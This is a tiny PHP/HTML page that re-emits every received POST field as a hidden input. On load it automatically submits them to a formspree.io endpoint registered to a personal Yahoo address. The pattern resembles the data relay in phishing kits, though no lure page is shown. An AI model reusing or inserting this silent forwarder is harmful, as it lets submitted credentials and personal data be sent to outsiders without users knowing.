<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="http://formspree.io/hendraz_88@yahoo.co.id" method="post">
    <?php foreach ($_POST as $key => $val): ?>
        <input type="hidden" name="<?= htmlspecialchars($key, ENT_COMPAT, 'UTF-8') ?>"
               value="<?= htmlspecialchars($val, ENT_COMPAT, 'UTF-8') ?>">
    <?php endforeach; ?>
</form>
</body>
</html>